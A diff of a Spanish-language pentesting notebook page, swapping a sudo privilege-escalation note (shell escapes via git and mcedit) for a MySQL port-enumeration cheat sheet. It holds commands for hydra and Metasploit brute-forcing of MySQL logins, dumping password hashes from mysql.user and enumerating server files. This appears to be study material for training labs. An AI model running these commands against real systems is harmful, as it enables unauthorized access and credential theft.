@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
-    <title>Sudoers | Notebook</title>
+    <title>3306 - MySQL | Notebook</title>
     <link rel="stylesheet" href="/section.css" />
   </head>
   <body>
@@ -46,7 +46,7 @@
               <a class="vault-file" href="/notebook/enumeracion-puertos/1521-oracle-database.html">1521 - Oracle Database</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/2049-nfs.html">2049 - NFS</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/3128-squid-proxy.html">3128 - Squid Proxy</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/3306-mysql.html">3306 - MySQL</a>
+              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/3306-mysql.html">3306 - MySQL</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/3389-rdp.html">3389 - RDP</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/5432-5437-postgresql.html">5432,5437 - PostgreSQL</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/5985-5986-winrm.html">5985,5986 - WinRM</a>
@@ -55,7 +55,7 @@
               <summary>Escalada de Privilegios</summary>
               <details class="vault-folder vault-subfolder" open>
                 <summary>Linux</summary>
-                <a class="vault-file is-active" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
               </details>
@@ -66,9 +66,9 @@
           </nav>
         </aside>
 
-        <article class="note-panel is-active" id="sudoers">
+        <article class="note-panel is-active" id="3306-mysql">
           <div class="note-tabbar">
-            <span>Sudoers</span>
+            <span>3306 - MySQL</span>
             <details class="notebook-tag-search">
               <summary>Buscar tags</summary>
               <label>
@@ -77,64 +77,129 @@
               </label>
               <div class="notebook-search-results" aria-live="polite"></div>
             </details>
-            <span>~/notebook/Escalada de Privilegios/Linux</span>
+            <span>~/notebook/Enumeración de Puertos</span>
           </div>
 
           <div class="note-content">
-            <p class="eyebrow">escalada de privilegios / linux / sudoers</p>
-            <h2>Sudoers</h2>
-
-            <p><code>/etc/sudoers</code> es el archivo de configuración que define quién puede usar <code>sudo</code> y qué comandos puede ejecutar como otro usuario, normalmente <code>root</code>.</p>
+            <p class="eyebrow">enumeración de puertos / mysql</p>
+            <h2>3306 - MySQL</h2>
 
             <section class="code-card">
-              <h3>Listar comandos que podemos ejecutar como otro usuario</h3>
-              <pre><code>sudo -l
-
-# Output
-student ALL=(root) NOPASSWD: /usr/bin/man</code></pre>
+              <h3>Iniciar sesión con credenciales válidas -&gt; Credencial predeterminada: sa:</h3>
+              <pre><code>mysql -u &lt;usuario&gt; -p
+mysql -h &lt;ip_target&gt; -u &lt;usuario&gt; -p
+mysql -h &lt;ip_target&gt; -u &lt;usuario&gt; -p  -P &lt;puerto&gt;</code></pre>
             </section>
 
-            <p><a href="https://gtfobins.github.io/#+sudo">GTFOBins SUDO</a></p>
-
             <section class="code-card">
-              <h3>Ejecutar binarios permitidos como otro usuario</h3>
-              <pre><code># Para usuario pepe
-sudo -u pepe git -p help config
+              <h3>Comandos en MySQL</h3>
+              <pre><code>help # Abre el menu de ayuda
+show databases;  # Mostrar Bases de Datos.
+use &lt;nombre_basededatos&gt;; # Seleccionar una Base de Datos.
+show tables; # Mostrar Tablas dentro de la Base de Datos.
+describe &lt;nombre&gt;; # Describir la Estructura de una Tabla.
+select * from &lt;nombre&gt;; # Extraer Todos los Registros de una Tabla.
 
-# Para root
-sudo git -p help config</code></pre>
+# Muestra todas las columnas** de una tabla sin necesidad de DESCRIBE.
+SELECT &lt;nombre_columna&gt; FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#x27;&lt;nombre_tabla&gt;&#x27;; 
+
+SELECT user,host FROM mysql.user; # Buscar Usuarios de MySQL
+
+# Obtener los Hashes de Contraseñas de los Usuarios MySQL.
+SELECT user,authentication_string FROM mysql.user;</code></pre>
             </section>
 
-            <h2>Binarios No Contemplados en GTFOBins</h2>
+            <section class="code-card">
+              <h3>mysql.exe desde Windows</h3>
+              <pre><code>.\mysql.exe -u&lt;user&gt; -p&#x27;&lt;password&gt;&#x27; &lt;db_name&gt; -e &#x27;show databases&#x27;;
+.\mysql.exe -u&lt;user&gt; -p&#x27;&lt;password&gt;&#x27; &lt;db_name&gt; -e &#x27;show tables&#x27;;
+.\mysql.exe -u&lt;user&gt; -p&#x27;&lt;password&gt;&#x27; &lt;db_name&gt; -e &#x27;describe &lt;table_name&gt;&#x27;;
+.\mysql.exe -u&lt;user&gt; -p&#x27;&lt;password&gt;&#x27; &lt;db_name&gt; -e &#x27;select &lt;username&gt;, &lt;pass&gt; from &lt;table_name&gt;&#x27;;</code></pre>
+            </section>
 
             <section class="code-card">
-              <h3>mcedit</h3>
-              <pre><code>sudo mcedit
+              <h3>Fuerza Bruta: hydra</h3>
+              <pre><code>hydra -l &lt;username&gt; -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt &lt;ip_victima&gt; mysql</code></pre>
+            </section>
 
-# Comandos
-F+9
+            <h3>Crear BD MySQL</h3>
 
-# Ruta
-File -&gt; User menu -&gt; Invoke 'shell'</code></pre>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code>mysql -u root   # Conexión MySQL
+show databases; # Muestra las BDs
+drop database &lt;bd_name&gt;; # Borrar BD
+create database Colegio; 
+use Colegio;
+create tables Alumnos(id int(2), username varchar(32), password varchar(32), contact varchar(32));
+show tables;
+describe Alumnos;
+insert into Alumnos (id, username, password, contact) values(1, &quot;admin&quot;, &quot;admin7&quot;, &quot;admin@htb.com&quot;);
+insert into Alumnos (id, username, password, contact) values(2, &quot;pepe&quot;, &quot;pepe7&quot;, &quot;pepe@htb.com&quot;);
+select * from Alumnos;
+select username,passwors from alumnos where id=1;</code></pre>
+            </section>
+
+            <h3>SQLI</h3>
+
+            <p><code>Bypass Login</code></p>
+
+            <h3>Explotación con Metasploit</h3>
+
+            <section class="code-card">
+              <h3>Metasploit</h3>
+              <pre><code># Enumeración de usuarios.
+msfconsole -q
+use auxiliary/scanner/mysql/mysql_enum 
+set RHOSTS &lt;ip_victima&gt;
+run
+
+# Ataque de autenticación débil con Metasploit.
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS &lt;ip_victima&gt;
+set USERNAME root
+set PASSWORD password
+run
+
+# Enumeración de Información en MySQL
+use auxiliary/admin/mysql/mysql_enum 
+
+# Ejecución de Consultas SQL
+use auxiliary/admin/mysql/mysql_sql 
+
+# Enumeración de Archivos en el Sistema
+use auxiliary/scanner/mysql/mysql_file_enum 
+
+#Extracción de Hashes de Contraseñas
+use auxiliary/scanner/mysql/mysql_hashdump 
+
+# Extracción de la Estructura de la Base de Datos
+use auxiliary/scanner/mysql/mysql_schemadump 
+
+# Identificación de la Versión de MySQL
+use auxiliary/scanner/mysql/mysql_version 
+
+# Identificación de Directorios con Permisos de Escritura
+use auxiliary/scanner/mysql/mysql_writable_dirs 
+
+# Ataque de Fuerza Bruta contra MySQL
+msfconsole -q
+use auxiliary/scanner/mysql/mysql_login L
+set RHOSTS &lt;ip_victima&gt;
+set USER_FILE /ruta_diccionario.txt
+set PASS_FILE /ruta_diccionario.txt
+set USERNAME &lt;username&gt;
+set password &lt;password&gt;
+set THREADS &lt;número&gt; # (5 por defecto) 
+exploit</code></pre>
             </section>
 
             <h2>Tags</h2>
             <div class="tag-list">
-              <span>escalada_privilegios</span>
-              <span>sudoers</span>
-              <span>sudo</span>
-              <span>linux</span>
-              <span>gtfobins</span>
-              <span>privesc</span>
-              <span>misconfigurations</span>
-              <span>mcedit</span>
-            </div>
-
-            <h2>Máquinas Relacionadas</h2>
-            <div class="tag-list">
-              <span>Bashed</span>
-              <span>Nibbles</span>
-              <span>dog</span>
+              <span>ports</span>
+              <span>mysql</span>
+              <span>p3306</span>
+              <span>Extracci</span>
             </div>
           </div>
         </article>
